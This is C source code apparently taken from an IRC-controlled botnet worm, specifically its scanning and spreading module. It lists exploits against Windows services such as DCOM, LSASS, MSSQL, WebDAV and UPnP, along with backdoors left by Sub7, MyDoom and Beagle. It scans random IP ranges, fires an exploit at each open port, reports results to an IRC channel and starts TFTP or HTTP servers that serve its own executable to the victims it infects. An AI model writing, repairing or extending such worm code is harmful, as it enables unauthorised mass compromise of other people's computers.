#include "includes.h"
#include "functions.h"
#include "externs.h"


// globals
ADVINFO advinfo[MAXTHREADS];
CRITICAL_SECTION CriticalSection; 

EXPLOIT exploit[]={
	#ifndef NO_NETBIOS
	{"netbios", "NetBios", 139, netbios, 0, FALSE, FALSE},
	#endif
	{"ntpass", "NTPass", 445, NTPass, 0, FALSE, FALSE},
	{"ws", "WksSvc", 139, WksSvc, 0, TRUE, FALSE},
	{"dcom135", "Dcom135", 135, dcom, 0, TRUE, FALSE},
	{"dcom445", "Dcom445", 445, dcom, 0, TRUE, FALSE},
	{"dcom1025", "Dcom1025", 1025, dcom, 0, TRUE, FALSE},
	{"dcom2", "Dcom2", 135, dcom2, 0, TRUE, FALSE},
	{"mssql", "MSSQL", 1433, MSSQL, 0, TRUE, FALSE},
	{"webdav", "WebDav", 80, webdav, 0, TRUE, FALSE},
	#ifndef NO_BEAGLE
	{"beagle1", "Beagle1", 2745, Beagle, 0, FALSE, TRUE},
	{"beagle2", "Beagle2", 2745, Beagle, 0, FALSE, TRUE},
	#endif
	#ifndef NO_LSASS
	{"lsass", "lsass", 445, lsass, 0, TRUE, FALSE},
	#endif
	#ifndef NO_SUB7
	{"sub7", "Sub7", 27347, Sub7, 0, FALSE, FALSE},
	#endif
	#ifndef NO_KUANG2
	{"kuang2", "Kuang2", 17300, Kuang, 0, FALSE, FALSE},
	#endif
	#ifndef NO_NETDEVIL
	{"netdevil","NetDevil", 903, NetDevil, 0, FALSE, FALSE},
	#endif
	{"mydoom", "MyDoom", 3127, MyDoom, 0, FALSE, TRUE},
	{"optix", "Optix", 3140, RootOptix, 0, FALSE, FALSE},
	{"upnp", "UPNP", 5000, upnp, 0, FALSE, TRUE},
	{"dameware", "DameWare", 6129, DameWare, 0, FALSE, TRUE},
	{NULL, NULL, 0, NULL, 0, FALSE, FALSE}
};
//int exploitnum=(sizeof(exploit) / sizeof(EXPLOIT));

void ListExploitStats(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "[scan]: Exploit Statistics:");
	for(int i=0; exploit[i].port != 0; i++) {
		extotal += exploit[i].stats;
		sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
		strncat(buffer, buffer2, sizeof(buffer));
	}
	sprintf(buffer2, " Total: %d in %s.", extotal, Uptime(started));
	strncat(buffer, buffer2, sizeof(buffer));

	irc_privmsg(sock, chan, buffer, notice);
	addlog(buffer);

	return;
}

void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum)
{
	char sendbuf[IRCLINE];

	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;

		sprintf(sendbuf, "[scan]: Current IP: %s.",finet_ntoa(in));
	} else 
		sprintf(sendbuf ,"[scan]: Scan not active.");

	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}

void CheckServers(ADVSCAN scan)
{
	char sendbuf[IRCLINE];

	DWORD id;

	if(scan.exploit != -1) {
		if (exploit[scan.exploit].tftp == TRUE) {
			if (findthreadid(TFTP_THREAD) == 0) {
				TFTP tftp;
				tftp.threads=0;

				GetModuleFileName(0,tftp.filename,MAX_PATH);
				strncpy(tftp.requestname, filename, sizeof(tftp.requestname)-1);
				strcpy(tftp.chan, channel);
				tftp.notice = scan.notice;
				tftp.silent = FALSE;
				tftp.info = FALSE;
				tftp.socket = scan.sock;
				
				sprintf(sendbuf, "[tftp]: Server started on Port: %d, File: %s, Request: %s.", tftpport, tftp.filename, tftp.requestname);

				tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
				strncpy(threads[tftp.threadnum].file,tftp.filename,sizeof(threads[tftp.threadnum].file)-1);
				threads[tftp.threadnum].port = tftpport;
				threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (void *)&tftp, 0, &id);

				while (tftp.info == FALSE) 
					Sleep(50);

				addlog(sendbuf);
			}
		} else if (exploit[scan.exploit].http == TRUE) {
			if (findthreadid(HTTP_THREAD) == 0) {
				char dirpath[MAX_PATH],*c;
				GetModuleFileName(0,dirpath,MAX_PATH);
				if ((c=strrchr(dirpath,'\\')) != NULL)
					*c='\0';
				
				if ((HTTP_server(GetIP(scan.sock),httpport,dirpath,FALSE)) == -1)
					sprintf(sendbuf,"[http]: Server failed to start.");
				else 
					sprintf(sendbuf,"[http]: Server started on IP: %s:%d, Directory: %s\\.", GetIP(scan.sock), httpport, dirpath);
				addlog(sendbuf);

			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return INVALID_SOCKET;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL t;
	t.tv_sec=delay;
	t.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&t);
	fclosesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

DWORD WINAPI AdvPortScanner(LPVOID param)
{
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	//ADVSCAN *scanp = (ADVSCAN *)param;
	//scanp->cgotinfo = TRUE;

	DWORD threadnum=scan.cthreadnum;
	DWORD threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"[scan]: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", 
			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP, scan.port, scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				sprintf(logbuf,"[scan]: IP: %s, Port %d is open.",finet_ntoa(in),scan.port);
				irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
				addlog(logbuf);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo);
				/*if (exploit[scan.exploit].exfunc(exinfo)) {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"[scan]: Finished with IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				} else {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"[scan]: Failed to exploit IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				}*/

			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(0);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	char buffer[LOGLINE], szSelfExe[MAX_PATH];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);
/*
	// FIX ME: Make this a standalone function
	if (!FileExists(szLocalPayloadFile)) {
		GetModuleFileName(0,szSelfExe,MAX_PATH);
		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
		// FIX ME: Make this copy to the same directory (could affect other stuff)
	}
*/
	CheckServers(scan);

	if (findthreadid(SCAN_THREAD) == 1) {
		DeleteCriticalSection(&CriticalSection); // just in case

		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400)) {
			// failed to initialize CriticalSection
			sprintf(buffer,"[scan]: Failed to initialize critical section.");
			if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
			addlog(buffer);

			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++) {
		scan.cthreadid = i;
		sprintf(buffer,"[scan]: %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		scan.cthreadnum = addthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		threads[scan.cthreadnum].port = scan.port;
		threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(void *)&scan,0,0);
		Sleep(50);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"[scan]: Finished at %s:%d after %d minute(s) of scanning.", finet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}

/*
void DelPayloadFile(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (findthreadid(SCAN_THREAD) > 0) 
		sprintf(sendbuf ,"[scan]: Scanner is running. Could not delete payload file.");
	else {
		if (GetFileAttributes(szLocalPayloadFile) != INVALID_FILE_ATTRIBUTES) {
			SetFileAttributes(szLocalPayloadFile,FILE_ATTRIBUTE_NORMAL);

			if (DeleteFile(szLocalPayloadFile))
				sprintf(sendbuf,"[SCAN]: Removed payload file: '%s'.", szLocalPayloadFile);
			else
				sprintf(sendbuf,"[SCAN]: Failed to remove payload file: '%s'.", szLocalPayloadFile);
		} else
			sprintf(sendbuf,"[SCAN]: Payload file: '%s' does not exist.", szLocalPayloadFile);
	}
	if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
	addlog(sendbuf);

	return;
} 
*/